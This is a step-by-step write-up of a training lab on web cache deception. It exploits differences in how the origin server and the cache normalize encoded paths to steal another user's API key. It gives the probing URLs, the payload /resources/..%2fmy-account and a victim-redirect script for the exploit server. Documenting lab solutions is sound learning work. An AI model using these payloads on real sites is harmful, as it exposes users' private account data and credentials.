# Lab 3 — Exploiting origin server normalization for web cache deception

> [← Back to Web Cache Deception](../README.md)

---

## 🎯 Objective
Exploit a URL normalization discrepancy between the origin server and cache to steal Carlos's API key.

---

## 🪜 Steps

### Step 1 — Login to wiener account
Credentials: `wiener:peter`

> 📸 Add screenshot here

---

### Step 2 — Intercept and send to Repeater
Intercept `GET /my-account` and send to **Repeater**.

> 📸 Add screenshot here

---

### Step 3 — Test path handling
Try these URLs:
- `/my-account/abc` → **404 Not Found**
- `/my-accountabc` → **404 Not Found**

> 📸 Add screenshot here

---

### Step 4 — Test delimiters via Intruder
Use **Sniper attack** with delimiters after `/my-account`. Uncheck URL-encode.

Result: only `?` returns **200 OK**.

> 📸 Add screenshot here

---

### Step 5 — Test URL normalization
Try: `/aaa/..%2fmy-account`

If the origin server resolves this encoded dot-segment and returns `200 OK` with your account data — normalization is happening on the origin side.

> 📸 Add screenshot here

---

### Step 6 — Identify cache rules
Test: `/resources/anything`
- 1st request → **X-Cache: miss**
- 2nd request → **X-Cache: hit**

The cache stores anything under `/resources/`.

> 📸 Add screenshot here

---

### Step 7 — Combine the exploit
Try: `GET /resources/..%2fmy-account`
- 1st request → miss
- 2nd request → **hit** ✅

Origin resolves it to `/my-account` (returns user data), but cache stores it because the path starts with `/resources/`.

> 📸 Add screenshot here

---

### Step 8 — Deliver exploit to victim
On exploit server, paste:

```html
<script>
  document.location="https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account?wcd"
</script>
```

Store → Deliver to victim.

> 📸 Add screenshot here

---

### Step 9 — Access Carlos's API key
Request `/resources/..%2fmy-account?wcd` in Repeater. The cached response contains **Carlos's API key**.

Submit it to solve the lab.

> 📸 Add screenshot here

---

## ✅ Result
Lab solved!

---

## 💡 Key Takeaway
When the origin server normalizes encoded path segments but the cache does not, attackers can craft URLs that the cache treats as static resources but the origin resolves to sensitive endpoints.
